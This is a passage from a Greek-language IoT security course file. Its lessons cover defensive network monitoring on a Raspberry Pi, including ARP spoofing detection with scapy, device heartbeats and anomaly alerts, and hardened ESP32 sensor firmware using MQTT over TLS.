            return opt[1].decode(errors="replace")[:32]
    return None


def handle(pkt):
    if ARP in pkt and pkt[ARP].op in (1, 2):           # who-has / is-at
        seen(pkt[ARP].hwsrc, pkt[ARP].psrc)
    elif DHCP in pkt and Ether in pkt:
        seen(pkt[Ether].src, None, dhcp_hostname(pkt), how="dhcp")


def active_scan():
    while True:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=SUBNET),
                     iface=IFACE, timeout=3, verbose=False)
        for _, r in ans:
            seen(r[ARP].hwsrc, r[ARP].psrc, how="scan")
        time.sleep(600)


print(f"Γνωστές συσκευές: {len(known)}. Ακούω στο {IFACE}…")
threading.Thread(target=active_scan, daemon=True).start()
sniff(iface=IFACE, filter="arp or (udp and (port 67 or port 68))", prn=handle, store=False)
`, L(
            '- **Παθητικά:** κάθε συσκευή στέλνει ARP για να βρει τον gateway, και DHCP όταν μπαίνει στο δίκτυο. Δεν χρειάζεται να «χτυπήσουμε» κανέναν.',
            '- `pkt[ARP].op in (1, 2)`: 1 = who-has (ερώτηση), 2 = is-at (απάντηση). Και οι δύο αποκαλύπτουν MAC + IP του αποστολέα.',
            '- **DHCP option `hostname`**: εδώ βλέπεις το `sensor01` που έβαλες με `WiFi.setHostname()`. Το κόβουμε στους 32 χαρακτήρες (δεδομένα από το δίκτυο = μη έμπιστα).',
            '- **Ενεργά:** κάθε 10 λεπτά, ένα ARP scan σε όλο το υποδίκτυο (`srp` = send/receive στο layer 2) πιάνει και όσες συσκευές είναι σιωπηλές.',
            '- `filter=…`: BPF φίλτρο στον kernel, ώστε η Python να βλέπει μόνο ARP/DHCP (λιγότερο CPU στο Pi).',
            '- `store=False`: δεν κρατά τα πακέτα στη μνήμη (αλλιώς σε λίγες μέρες γεμίζει η RAM).',
            '- Οι γνωστές συσκευές μένουν σε JSON. Την πρώτη φορά «μαθαίνει» όλο το δίκτυο (baseline). Μετά, κάθε νέα MAC = ειδοποίηση.'
          )),
          tip('Πολλά κινητά χρησιμοποιούν **τυχαία MAC** (private Wi‑Fi address) ανά δίκτυο. Στο IoT δίκτυο όμως τα ESP32 έχουν σταθερή MAC, οπότε **κάθε** νέα MAC εκεί αξίζει να την κοιτάξεις.'),
          quiz('Γιατί το NetWatch στο Pi το βλέπουμε μέσω `ssh -L` αντί να το ανοίξουμε στο `0.0.0.0`;',
            ['Γιατί είναι πιο γρήγορο', 'Γιατί έτσι η διεπαφή δεν εκτίθεται σε κανέναν στο δίκτυο· η πρόσβαση θέλει το SSH κλειδί σου και είναι κρυπτογραφημένη', 'Γιατί το NetWatch δεν δουλεύει αλλιώς στο Pi', 'Για να μη χρειάζεται sudo'], 1,
            'Ένα εργαλείο ασφαλείας με πληροφορίες για όλο το δίκτυο δεν πρέπει να γίνει το ίδιο στόχος. Το SSH tunnel το κρατάει ιδιωτικό.'),
          quiz('Γιατί το `new_devices.py` ακούει και DHCP, όχι μόνο ARP;',
            ['Το DHCP είναι πιο γρήγορο', 'Για να μάθει το hostname της συσκευής (option 12) και να την πιάσει τη στιγμή που μπαίνει στο δίκτυο', 'Γιατί το ARP είναι κρυπτογραφημένο', 'Δεν χρειάζεται'], 1,
            'Το DHCP request έρχεται πρώτο, μόλις η συσκευή συνδεθεί, και συχνά περιέχει το όνομά της. Πολύ χρήσιμο για να καταλάβεις **τι** είναι.'),
        ],
      },
      {
        id: 'iot-8-2', title: 'Ανίχνευση ARP spoofing με scapy', minutes: 15,
        goal: 'Να καταλάβεις πώς δουλεύει το **ARP spoofing** (MITM στο LAN) και να γράψεις ανιχνευτή που ειδοποιεί όταν αλλάζει η MAC του gateway ή όταν βλέπει «βροχή» από ARP replies.',
        blocks: [
          text(
            'Το **ARP** αντιστοιχίζει IP σε MAC μέσα στο LAN και **δεν έχει καμία πιστοποίηση**: όποιος απαντήσει, τον πιστεύουν. Ο επιτιθέμενος στέλνει συνεχώς «το 192.168.1.1 είναι στη δική μου MAC» και όλη η κίνηση προς το Internet περνά από αυτόν (**Man-in-the-Middle**).',
            '',
            'Για τα ESP32 σου αυτό σημαίνει: ό,τι **δεν** είναι TLS διαβάζεται και αλλοιώνεται. Γι’ αυτό το TLS με CA (Εν. 4) είναι η πραγματική άμυνα, και η ανίχνευση σου λέει **ότι** κάποιος το δοκιμάζει.'
          ),
          anim('iot-arp-spoof', 'Το Pi κρατά baseline για τη MAC του gateway και φωνάζει μόλις αλλάξει.'),
          code('python', 'arp_guard.py: ανιχνευτής ARP spoofing', R`
#!/usr/bin/env python3
"""Ανίχνευση ARP spoofing: αλλαγή MAC για γνωστή IP, ιδίως του gateway."""
import time
from collections import defaultdict, deque
from scapy.all import ARP, Ether, conf, getmacbyip, sniff

IFACE = "eth0"
GATEWAY = conf.route.route("0.0.0.0")[2]          # η IP του default gateway
GW_MAC = (getmacbyip(GATEWAY) or "").lower()       # baseline με ενεργό ARP
print(f"Gateway {GATEWAY} = {GW_MAC}")

table = {}                                         # ip -> mac (ό,τι έχουμε μάθει)
replies = defaultdict(lambda: deque(maxlen=50))    # mac -> χρόνοι is-at
last_alert = {}


def alert(key, text, every=60):
    now = time.time()
    if now - last_alert.get(key, 0) > every:       # όχι spam: 1 ειδοποίηση/λεπτό
        last_alert[key] = now
        print(time.strftime("%F %T"), "🚨", text, flush=True)


def handle(pkt):
    if ARP not in pkt or pkt[ARP].op != 2:         # μόνο is-at (απαντήσεις)
        return
    ip, mac = pkt[ARP].psrc, pkt[ARP].hwsrc.lower()

    # 1) Η MAC του gateway άλλαξε → σχεδόν σίγουρα MITM
    if ip == GATEWAY and GW_MAC and mac != GW_MAC:
        alert(("gw", mac), f"ARP SPOOF του gateway! {ip} is-at {mac} (σωστό: {GW_MAC})")

    # 2) Οποιαδήποτε IP άλλαξε MAC
    old = table.get(ip)
    if old and old != mac:
        alert(("chg", ip), f"Η {ip} άλλαξε MAC: {old} → {mac}")
    table[ip] = mac

    # 3) Ethernet src ≠ ARP src: πλαστό πακέτο
    if Ether in pkt and pkt[Ether].src.lower() != mac:
        alert(("eth", mac), f"Ασυμφωνία MAC: Ethernet {pkt[Ether].src} vs ARP {mac}")

    # 4) Πάρα πολλά is-at από την ίδια MAC (εργαλεία spoofing στέλνουν κάθε 1-2s)
    q = replies[mac]
    q.append(time.time())
    if len(q) >= 20 and q[-1] - q[0] < 30:
        alert(("rate", mac), f"{mac}: {len(q)} ARP replies σε {q[-1] - q[0]:.0f}s (ύποπτο)")


sniff(iface=IFACE, filter="arp", prn=handle, store=False)
`, L(
            '- `conf.route.route("0.0.0.0")[2]`: ο πίνακας δρομολόγησης του scapy δίνει την IP του default gateway.',
            '- `getmacbyip()`: στέλνει ARP request και παίρνει τη **σωστή** MAC στην αρχή (baseline). Αν ο επιτιθέμενος είναι ήδη ενεργός όταν ξεκινάς, το baseline μπορεί να είναι λάθος: γι’ αυτό καλό είναι να βάλεις τη MAC του router **χειροκίνητα** (τη βλέπεις στην ετικέτα του ή στο NetWatch).',
            '- Έλεγχος 1: το σημαντικότερο. Η MAC του gateway σπάνια αλλάζει (μόνο αν αλλάξεις router).',
            '- Έλεγχος 3: πολλά εργαλεία βάζουν διαφορετική MAC στο Ethernet header από αυτή μέσα στο ARP.',
            '- Έλεγχος 4: `deque(maxlen=50)` κρατά τους τελευταίους χρόνους. 20 απαντήσεις σε 30s από μία MAC είναι πολύ πάνω από το φυσιολογικό.',
            '- `alert(…, every=60)`: rate limiting των ειδοποιήσεων, για να μη «πνιγείς» σε θόρυβο.'
          )),
          code('bash', 'Τρέξ’ το ως υπηρεσία systemd', R`
sudo tee /etc/systemd/system/arp-guard.service >/dev/null <<'EOF'
[Unit]
Description=ARP spoofing detector
After=network-online.target
Wants=network-online.target

[Service]
ExecStart=/home/maria/iot-venv/bin/python /home/maria/arp_guard.py
Restart=always
RestartSec=10
# Χρειάζεται μόνο raw sockets, όχι πλήρες root
AmbientCapabilities=CAP_NET_RAW CAP_NET_ADMIN
CapabilityBoundingSet=CAP_NET_RAW CAP_NET_ADMIN
User=maria
NoNewPrivileges=yes
ProtectSystem=strict

[Install]
WantedBy=multi-user.target
EOF
sudo systemctl daemon-reload
sudo systemctl enable --now arp-guard
journalctl -u arp-guard -f
`, L(
            '- `AmbientCapabilities=CAP_NET_RAW`: ο χρήστης `maria` (όχι root) μπορεί να κάνει sniffing. **Αρχή ελάχιστων δικαιωμάτων.**',
            '- `NoNewPrivileges`, `ProtectSystem=strict`: ακόμα κι αν το script παραβιαστεί (π.χ. bug στο parsing), δεν γράφει στο σύστημα και δεν αποκτά root.',
            '- `Restart=always`: αν κρασάρει, ξαναξεκινά σε 10s.',
            '- Οι ειδοποιήσεις πάνε στο journal: `journalctl -u arp-guard -f`.'
          )),
          nw('alerts', 'Το NetWatch ανιχνεύει ARP spoofing αυτόματα και το δείχνει στις **Επιθέσεις** (MITRE T1557.002). Σύγκρινε τις ειδοποιήσεις του με το δικό σου script.'),
          tip('Για συσκευές που μένουν σε ένα σημείο (Pi broker, NAS), μπορείς να βάλεις **στατική ARP εγγραφή** για τον gateway: `sudo ip neigh replace 192.168.1.1 lladdr a4:2b:b0:11:22:33 dev eth0 nud permanent`. Τότε τα πλαστά ARP replies αγνοούνται.'),
          quiz('Το ARP spoofing πετυχαίνει. Τι **δεν** μπορεί να κάνει ο επιτιθέμενος στο MQTT του ESP32 σου (TLS με τη δική σου CA);',
            ['Να δει ότι υπάρχει κίνηση προς τον broker', 'Να διαβάσει ή να αλλάξει τα μηνύματα και τον κωδικό', 'Να κόψει τη σύνδεση (DoS)', 'Να δει τις IP'], 1,
            'Βλέπει μεταδεδομένα και μπορεί να κόψει τη σύνδεση, αλλά το **περιεχόμενο** προστατεύεται από το TLS και τον έλεγχο της CA.'),
          quiz('Ποιο σήμα είναι το πιο **ισχυρό** για ARP spoofing σε οικιακό δίκτυο;',
            ['Μια νέα συσκευή στο δίκτυο', 'Η IP του gateway απαντά ξαφνικά με διαφορετική MAC', 'Ένα ARP request', 'Μια συσκευή άλλαξε IP μέσω DHCP'], 1,
            'Ο gateway είναι ο κύριος στόχος του MITM και η MAC του πρακτικά δεν αλλάζει ποτέ.'),
        ],
      },
      {
        id: 'iot-8-3', title: 'Heartbeat, logging και ανίχνευση ανωμαλιών', minutes: 20,
        goal: 'Να κάνεις τα ESP32 να στέλνουν **heartbeat** με μετρήσεις υγείας (uptime, RSSI, heap, reset reason, BSSID), και να γράψεις στο Pi ένα `monitor.py` που ανιχνεύει σιωπή, επανεκκινήσεις και ανωμαλίες.',
        blocks: [
          text(
            'Μια παραβιασμένη ή χαλασμένη συσκευή συχνά **συμπεριφέρεται διαφορετικά** πριν κάνει κάτι φανερά κακό:',
            '- Σταματά να στέλνει (κάποιος την έβγαλε από το ρεύμα, ή κρασάρει).',
            '- Κάνει **επανεκκινήσεις** (crash από κακόβουλο input, brownout, watchdog).',
            '- Το **RSSI** ή το **BSSID** αλλάζει απότομα (συνδέθηκε σε άλλο AP: evil twin;).',
            '- Η **ελεύθερη μνήμη** μειώνεται σταθερά (memory leak, ή κάτι τρέχει που δεν έπρεπε).',
            '- Στέλνει **πολύ περισσότερα** μηνύματα από ό,τι συνήθως.',
            '- Στέλνει τιμές **εκτός φυσικών ορίων** (θερμοκρασία 300°C).'
          ),
          anim('iot-heartbeat', 'Heartbeat + Last Will: ο monitor ξέρει πάντα ποιος ζει και αν συμπεριφέρεται φυσιολογικά.'),
          code('cpp', 'heartbeat.h: μετρήσεις υγείας από το ESP32', R`
#pragma once
#include <WiFi.h>
#include <PubSubClient.h>
#include <esp_system.h>

extern PubSubClient mqtt;

static const char* resetReasonStr() {
  switch (esp_reset_reason()) {
    case ESP_RST_POWERON:   return "poweron";
    case ESP_RST_SW:        return "software";
    case ESP_RST_PANIC:     return "panic";          // crash!
    case ESP_RST_INT_WDT:
    case ESP_RST_TASK_WDT:
    case ESP_RST_WDT:       return "watchdog";       // κόλλησε
    case ESP_RST_BROWNOUT:  return "brownout";       // πτώση τάσης
    case ESP_RST_DEEPSLEEP: return "deepsleep";
    default:                return "other";
  }
}

// Καλείται π.χ. κάθε 60s από το loop()
void publishHeartbeat(const char* topic, const char* fwVersion) {
  char buf[256];
  int n = snprintf(buf, sizeof(buf),
    "{\"fw\":\"%s\",\"up\":%lu,\"rssi\":%d,\"bssid\":\"%s\","
    "\"heap\":%u,\"minheap\":%u,\"reset\":\"%s\"}",
    fwVersion,
    (unsigned long)(millis() / 1000),
    WiFi.RSSI(),
    WiFi.BSSIDstr().c_str(),
    (unsigned)ESP.getFreeHeap(),
    (unsigned)ESP.getMinFreeHeap(),
    resetReasonStr());
  if (n > 0 && n < (int)sizeof(buf)) mqtt.publish(topic, buf);
}
`, L(
            '- `esp_reset_reason()`: **γιατί** έγινε η τελευταία εκκίνηση. Πολλά `panic` = κάτι κρασάρει τη συσκευή (bug ή επίθεση με κακό input).',
            '- `up` (uptime σε δευτερόλεπτα): αν μικρύνει, η συσκευή επανεκκίνησε.',
            '- `bssid`: η MAC του AP όπου είναι συνδεδεμένη. Αν αλλάξει χωρίς να έχεις mesh, κάτι συμβαίνει.',
            '- `minheap`: η χαμηλότερη ελεύθερη μνήμη από την εκκίνηση. Καλό για να βρεις leaks.',
            '- `snprintf` + έλεγχος `n`: αν το JSON δεν χωράει, δεν στέλνουμε κομμένο (άκυρο) JSON.'
          )),
          code('cpp', 'Watchdog: αν το loop κολλήσει, reset (Arduino core 3.x)', R`
#include <esp_task_wdt.h>

void setupWatchdog() {
  esp_task_wdt_config_t cfg = {
    .timeout_ms = 30000,          // 30s χωρίς reset → panic → reboot
    .idle_core_mask = 0,
    .trigger_panic = true,
  };
  if (esp_task_wdt_reconfigure(&cfg) != ESP_OK) esp_task_wdt_init(&cfg);
  esp_task_wdt_add(NULL);         // παρακολούθησε το τρέχον task (loop)
}

// Στο loop():  esp_task_wdt_reset();
`, L(
            '- Ο **Task Watchdog** επανεκκινεί τη συσκευή αν το task δεν «ταΐσει» τον watchdog (`esp_task_wdt_reset()`) για 30s.',
            '- Στο Arduino core 3.x (ESP-IDF 5) η ρύθμιση γίνεται με `esp_task_wdt_config_t`. Ο watchdog είναι συνήθως ήδη αρχικοποιημένος, γι’ αυτό πρώτα `reconfigure` και αν αποτύχει `init`.',
            '- Μετά από τέτοιο reset, το heartbeat θα γράφει `"reset":"watchdog"` και ο monitor θα το δει.'
          )),
          code('python', 'monitor.py: παρακολούθηση heartbeats και ανωμαλιών στο Pi', R`
#!/usr/bin/env python3
"""Heartbeat monitor: σιωπή, επανεκκινήσεις, αλλαγή BSSID, RSSI, μνήμη, ρυθμός μηνυμάτων."""
import json
import os
import ssl
import time
from collections import deque
import paho.mqtt.client as mqtt

BROKER, CA = "pi-broker.local", "/etc/mosquitto/certs/ca.crt"
HB_EVERY = 60                    # οι συσκευές στέλνουν κάθε 60s
SILENCE = 3 * HB_EVERY           # 3 χαμένα heartbeats → ειδοποίηση
MAX_MSGS_PER_MIN = 30

devs = {}                        # device -> κατάσταση


def state(dev):
    return devs.setdefault(dev, {"last": time.time(), "up": None, "bssid": None,
                                 "rssi": None, "heap": deque(maxlen=60),
                                 "msgs": deque(maxlen=200), "silent": False})


def alert(client, dev, text):
    line = f"{time.strftime('%F %T')} [{dev}] {text}"
    print("🚨", line, flush=True)
    client.publish(f"alerts/{dev}", text, qos=1)      # ο monitor έχει write στο alerts/#


def on_connect(c, userdata, flags, rc, props):
    if rc.is_failure:
        print("σύνδεση απέτυχε:", rc)
        return
    c.subscribe([("home/+/heartbeat", 1), ("home/+/status", 1), ("home/+/state", 0)])


def on_message(c, userdata, msg):
    parts = msg.topic.split("/")
    if len(parts) != 3:
        return
    dev, kind = parts[1], parts[2]
    s = state(dev)
    now = time.time()
    s["last"] = now
    s["msgs"].append(now)
    if s["silent"]:
        s["silent"] = False
        alert(c, dev, "επανήλθε")

    # Ρυθμός μηνυμάτων
    recent = [t for t in s["msgs"] if now - t < 60]
    if len(recent) > MAX_MSGS_PER_MIN:
        alert(c, dev, f"ασυνήθιστα πολλά μηνύματα: {len(recent)}/λεπτό")

    if kind == "status" and msg.payload == b"offline":
        alert(c, dev, "offline (Last Will)")
        return
    if kind != "heartbeat":
        return
    try:
        hb = json.loads(msg.payload)
        up, rssi, bssid = int(hb["up"]), int(hb["rssi"]), str(hb["bssid"])[:17]
        heap, reset = int(hb["heap"]), str(hb["reset"])[:16]
    except (ValueError, KeyError, TypeError):
        alert(c, dev, "άκυρο heartbeat")
        return

    if s["up"] is not None and up < s["up"]:
        alert(c, dev, f"επανεκκίνηση (reset={reset})")
    if reset in ("panic", "watchdog", "brownout") and up < HB_EVERY * 2:
        alert(c, dev, f"ασταθής: τελευταίο reset = {reset}")
    if s["bssid"] and bssid != s["bssid"]:
        alert(c, dev, f"άλλαξε AP: {s['bssid']} → {bssid} (mesh ή evil twin;)")
    if s["rssi"] is not None and s["rssi"] - rssi >= 20:
        alert(c, dev, f"απότομη πτώση σήματος {s['rssi']} → {rssi} dBm")
    s["heap"].append(heap)
    if len(s["heap"]) == s["heap"].maxlen and s["heap"][-1] < 0.7 * s["heap"][0]:
        alert(c, dev, f"η ελεύθερη μνήμη πέφτει σταθερά: {s['heap'][0]} → {heap}")
    s.update(up=up, rssi=rssi, bssid=bssid)


client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="monitor")
client.username_pw_set("monitor", os.environ["MQTT_PASS"])
client.tls_set(ca_certs=CA, cert_reqs=ssl.CERT_REQUIRED)
client.on_connect, client.on_message = on_connect, on_message
client.connect(BROKER, 8883, keepalive=60)
client.loop_start()

while True:                                   # έλεγχος σιωπής κάθε 15s
    time.sleep(15)
    now = time.time()
    for dev, s in list(devs.items()):
        if not s["silent"] and now - s["last"] > SILENCE:
            s["silent"] = True
            alert(client, dev, f"σιωπή για {int(now - s['last'])}s")
`, L(
            '- Συνδέεται με **TLS** ως χρήστης `monitor`, που στην ACL έχει `read home/#` και `write alerts/#` (Εν. 4.2).',
            '- **Σιωπή:** αν μια συσκευή δεν στείλει τίποτα για 3 διαστήματα heartbeat, ειδοποίηση. Δουλεύει ακόμα κι αν ο broker δεν στείλει LWT (π.χ. ήταν κι αυτός κάτω).',
            '- **Επανεκκίνηση:** το `up` μίκρυνε. Με `reset=panic` ή `watchdog`, η συσκευή κρασάρει: έλεγξε logs/firmware.',
            '- **BSSID:** αλλαγή AP. Σε σπίτι με ένα router χωρίς mesh, είναι ύποπτο.',
            '- **RSSI −20 dB:** η συσκευή μετακινήθηκε, κάτι μπήκε μπροστά, ή συνδέθηκε σε άλλο (πιο μακρινό ή πιο κοντινό) AP.',
            '- **Heap:** αν η ελεύθερη μνήμη έπεσε 30% μέσα σε 60 heartbeats, κάτι «τρώει» μνήμη.',
            '- **Ρυθμός:** πάνω από 30 μηνύματα/λεπτό από αισθητήρα που στέλνει 1–2 = bug ή παραβίαση.',
            '- Κάθε πεδίο του JSON ελέγχεται (τύπος, μήκος). Κακό heartbeat = ειδοποίηση, όχι crash του monitor.',
            '- `loop_start()`: το paho τρέχει σε δικό του thread, ενώ το κύριο thread ελέγχει για σιωπή.'
          )),
          tip('Οι ειδοποιήσεις στο `alerts/#` μπορούν να πάνε στο κινητό σου: ένα μικρό script που κάνει subscribe και στέλνει στο **Telegram** (όπως κάνει και το NetWatch), ή μια εφαρμογή MQTT στο κινητό (μέσα από VPN).'),
          quiz('Το heartbeat δείχνει `"reset":"panic"` κάθε λίγα λεπτά, μόνο όταν κάποιος στέλνει μήνυμα στο `cmd` topic. Τι υποψιάζεσαι;',
            ['Κακό Wi‑Fi', 'Bug στο χειρισμό του payload (π.χ. buffer overflow): κάποιος στέλνει κακόβουλο input', 'Λάθος ώρα NTP', 'Τίποτα σημαντικό'], 1,
            'Επαναλαμβανόμενα crashes που συνδέονται με εισερχόμενα μηνύματα είναι κλασικό σημάδι ότι κάποιος «ψάχνει» ευπάθεια στον parser σου. Έλεγξε όρια μήκους και ACL.'),
          quiz('Γιατί ο monitor ελέγχει **και** σιωπή, και όχι μόνο το LWT `offline`;',
            ['Το LWT δεν υπάρχει στο MQTT', 'Αν ο broker επανεκκινήσει ή η συσκευή «παγώσει» με ανοιχτό TCP, το LWT μπορεί να μην έρθει ή να αργήσει', 'Για να καταναλώνει λιγότερη CPU', 'Δεν χρειάζεται'], 1,
            'Άμυνα σε βάθος και στο monitoring: δύο ανεξάρτητοι μηχανισμοί πιάνουν περισσότερες περιπτώσεις.'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 9 — Τελικό project
  // ====================================================================
  M.push({
    id: 'iot-9', order: 9, title: 'Τελικό project: ασφαλές σύστημα αισθητήρων',
    desc: 'ESP32 + DHT22 → MQTT over TLS → Mosquitto στο Pi → dashboard. Όλα όσα έμαθες σε ένα σύστημα, με checklist και τελικό τεστ.',
    lessons: [
      {
        id: 'iot-9-1', title: 'Αρχιτεκτονική και το firmware του αισθητήρα', minutes: 25,
        goal: 'Να δεις την αρχιτεκτονική του τελικού συστήματος και να γράψεις **πλήρες, ασφαλές firmware** για ESP32 με DHT22: TLS, Last Will, heartbeat, εντολές με έλεγχο, watchdog.',
        blocks: [
          anim('iot-final-flow', 'Κάθε βέλος έχει τη δική του προστασία. Πάτα ▶ και δες ποια.'),
          table(['Κομμάτι', 'Ασφάλεια', 'Μάθημα'], [
            ['ESP32 firmware', 'secrets εκτός Git, έλεγχος εισόδου, watchdog, χωρίς debug logs', '3.1, 5.4, 8.3'],
            ['Wi‑Fi', 'Χωριστό IoT SSID, WPA2/WPA3, `setMinSecurity`', '3.2, 7.1, 7.2'],
            ['Μεταφορά', 'MQTT over TLS 8883, δική σου CA, `setCACert`', '4.3, 4.4'],
            ['Broker', 'Χρήστης ανά συσκευή, ACL, όχι anonymous, 1883 μόνο localhost', '4.2'],
            ['Pi', 'SSH με κλειδιά, ufw/nftables, fail2ban, unattended-upgrades', 'Εν. 2'],
            ['Dashboard', 'Μόνο ανάγνωση, autoescape, SQL με παραμέτρους, 127.0.0.1 + SSH tunnel', '9.2'],
            ['Παρακολούθηση', 'Heartbeat, LWT, monitor.py, NetWatch', 'Εν. 8'],
          ]),
          text(
            '### Υλικά',
            '- ESP32 DevKit (οποιοδήποτε), αισθητήρας **DHT22** (AM2302), αντίσταση 10kΩ (αν ο DHT22 δεν είναι σε module με ενσωματωμένη).',
            '- Σύνδεση: DHT22 **VCC → 3V3**, **GND → GND**, **DATA → GPIO4** (με 10kΩ pull-up προς 3V3).',
            '- Βιβλιοθήκες (Library Manager): **PubSubClient**, **DHT sensor library** (Adafruit) και **Adafruit Unified Sensor**.'
          ),
          code('cpp', 'secrets.h (εκτός Git!)', R`
#pragma once
#define WIFI_SSID  "IoT-Net"
#define WIFI_PASS  "ΕΝΑΣ-ΜΑΚΡΥΣ-ΤΥΧΑΙΟΣ-ΚΩΔΙΚΟΣ-24+"
#define MQTT_HOST  "pi-broker.local"       // στο SAN του server.crt
#define MQTT_PORT  8883
#define MQTT_USER  "sensor01"              // = client id = όνομα στα topics
#define MQTT_PASS  "8f2K-vQ9x-Lm3p-Tz7w"

static const char CA_CERT[] = R"PEM(
-----BEGIN CERTIFICATE-----
...το δικό σου ca.crt...
-----END CERTIFICATE-----
)PEM";
`, L(
            '- Ίδια δομή με την Εν. 4.4. Ένας χρήστης MQTT **ανά συσκευή**.',
            '- Για 2ο αισθητήρα: ίδιο firmware, άλλο `secrets.h` (ή provisioning από NVS, Εν. 3.3).'
          )),
          code('cpp', 'sensor_secure.ino: το πλήρες firmware', R`
// Τελικό project: DHT22 → MQTT over TLS (ESP32, Arduino core 3.x)
#include <WiFi.h>
#include <WiFiClientSecure.h>
#include <PubSubClient.h>
#include <Preferences.h>
#include <DHT.h>
#include <esp_task_wdt.h>
#include <esp_system.h>
#include <time.h>
#include "secrets.h"

#define FW_VERSION "1.0.0"
#define DHT_PIN    4
#define DHT_TYPE   DHT22

const char* DEV = MQTT_USER;
char tState[48], tStatus[48], tHeart[48], tCmd[48];

DHT dht(DHT_PIN, DHT_TYPE);
WiFiClientSecure net;
PubSubClient mqtt(net);
Preferences prefs;

uint32_t intervalS = 60;                  // διάστημα μετρήσεων (από NVS)
uint32_t lastRead = 0, lastBeat = 0, lastTry = 0, backoffMs = 2000;

// ---------- Wi‑Fi ----------
void connectWiFi() {
  WiFi.persistent(false);
  WiFi.setHostname(DEV);
  WiFi.mode(WIFI_STA);
  WiFi.setMinSecurity(WIFI_AUTH_WPA2_PSK);
  WiFi.begin(WIFI_SSID, WIFI_PASS);
  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED) {
    esp_task_wdt_reset();
    if (millis() - t0 > 20000) ESP.restart();
    delay(250);
  }
  Serial.printf("[WiFi] %s RSSI=%d\n", WiFi.localIP().toString().c_str(), WiFi.RSSI());
}

// ---------- Εντολές: whitelist + όρια ----------
void onMessage(char* topic, byte* payload, unsigned int len) {
  char buf[32];
  if (strcmp(topic, tCmd) != 0 || len == 0 || len >= sizeof(buf)) return;
  memcpy(buf, payload, len);
  buf[len] = '\0';

  if (strcmp(buf, "ping") == 0) {
    mqtt.publish(tStatus, "online", true);
  } else if (strncmp(buf, "interval=", 9) == 0) {
    char* end = nullptr;
    long v = strtol(buf + 9, &end, 10);
    if (end && *end == '\0' && v >= 10 && v <= 3600) {     // μόνο 10..3600 s
      intervalS = (uint32_t)v;
      prefs.begin("cfg", false);
      prefs.putUInt("interval", intervalS);
      prefs.end();
      Serial.printf("[CMD] interval=%lu\n", (unsigned long)intervalS);
    } else {
      Serial.println("[CMD] άκυρο interval");
    }
  } else {
    Serial.println("[CMD] άγνωστη εντολή");
  }
}

// ---------- MQTT ----------
bool connectMqtt() {
  if (mqtt.connect(DEV, MQTT_USER, MQTT_PASS, tStatus, 1, true, "offline")) {
    mqtt.publish(tStatus, "online", true);
    mqtt.subscribe(tCmd, 1);
    backoffMs = 2000;
    Serial.println("[MQTT] συνδέθηκε (TLS)");
    return true;
  }
  char err[96];
  int code = net.lastError(err, sizeof(err));
  Serial.printf("[MQTT] αποτυχία state=%d tls=%d %s\n", mqtt.state(), code, code ? err : "");
  return false;
}

// ---------- Μετρήσεις ----------
void readAndPublish() {
  float t = dht.readTemperature();
  float h = dht.readHumidity();
  if (isnan(t) || isnan(h) || t < -40 || t > 80 || h < 0 || h > 100) {
    Serial.println("[DHT] άκυρη μέτρηση, αγνοήθηκε");
    return;
  }
  char json[64];
  snprintf(json, sizeof(json), "{\"t\":%.1f,\"h\":%.1f}", t, h);
  mqtt.publish(tState, json);
}

const char* resetReasonStr() {
  switch (esp_reset_reason()) {
    case ESP_RST_POWERON:  return "poweron";
    case ESP_RST_SW:       return "software";
    case ESP_RST_PANIC:    return "panic";
    case ESP_RST_INT_WDT:
    case ESP_RST_TASK_WDT:
    case ESP_RST_WDT:      return "watchdog";
    case ESP_RST_BROWNOUT: return "brownout";
    default:               return "other";
  }
}

void heartbeat() {
  char buf[220];
  int n = snprintf(buf, sizeof(buf),
    "{\"fw\":\"%s\",\"up\":%lu,\"rssi\":%d,\"bssid\":\"%s\",\"heap\":%u,\"minheap\":%u,\"reset\":\"%s\"}",
    FW_VERSION, (unsigned long)(millis() / 1000), WiFi.RSSI(), WiFi.BSSIDstr().c_str(),
    (unsigned)ESP.getFreeHeap(), (unsigned)ESP.getMinFreeHeap(), resetReasonStr());
  if (n > 0 && n < (int)sizeof(buf)) mqtt.publish(tHeart, buf);
}

// ---------- setup / loop ----------
void setup() {
  Serial.begin(115200);
  Serial.printf("\n%s firmware %s\n", DEV, FW_VERSION);

  esp_task_wdt_config_t wdt = { .timeout_ms = 30000, .idle_core_mask = 0, .trigger_panic = true };
  if (esp_task_wdt_reconfigure(&wdt) != ESP_OK) esp_task_wdt_init(&wdt);
  esp_task_wdt_add(NULL);

  snprintf(tState,  sizeof(tState),  "home/%s/state", DEV);
  snprintf(tStatus, sizeof(tStatus), "home/%s/status", DEV);
  snprintf(tHeart,  sizeof(tHeart),  "home/%s/heartbeat", DEV);
  snprintf(tCmd,    sizeof(tCmd),    "home/%s/cmd", DEV);

  prefs.begin("cfg", true);
  intervalS = prefs.getUInt("interval", 60);
  prefs.end();

  dht.begin();
  connectWiFi();
  configTime(0, 0, "pool.ntp.org", "time.cloudflare.com");

  net.setCACert(CA_CERT);
  net.setHandshakeTimeout(15);
  mqtt.setServer(MQTT_HOST, MQTT_PORT);
  mqtt.setCallback(onMessage);
  mqtt.setBufferSize(512);
  mqtt.setKeepAlive(30);
}

void loop() {
  esp_task_wdt_reset();
  if (WiFi.status() != WL_CONNECTED) connectWiFi();

  if (!mqtt.connected()) {
    if (millis() - lastTry > backoffMs) {
      lastTry = millis();
      if (!connectMqtt()) backoffMs = min<uint32_t>(backoffMs * 2, 60000);
    }
    delay(50);
    return;
  }
  mqtt.loop();

  if (millis() - lastRead > intervalS * 1000UL) {
    lastRead = millis();
    readAndPublish();
  }
  if (millis() - lastBeat > 60000UL) {
    lastBeat = millis();
    heartbeat();
  }
  delay(10);
}
`, L(
            '- **Topics από το username**: `home/sensor01/…`. Ταιριάζουν ακριβώς με την ACL `pattern write home/%u/…`.',
            '- **Wi‑Fi**: ελάχιστο WPA2, timeout, χωρίς αποθήκευση στο NVS του driver. Ο watchdog «ταΐζεται» και μέσα στο loop σύνδεσης.',
            '- **Εντολές**: δεχόμαστε μόνο `ping` και `interval=N` με N από 10 έως 3600. Το `strtol` + έλεγχος `*end == \'\\0\'` απορρίπτει κείμενα όπως `interval=5abc`. Η νέα τιμή μένει στο NVS.',
            '- **TLS**: `setCACert` με τη δική σου CA, timeout handshake, λεπτομέρεια σφάλματος από `lastError()`.',
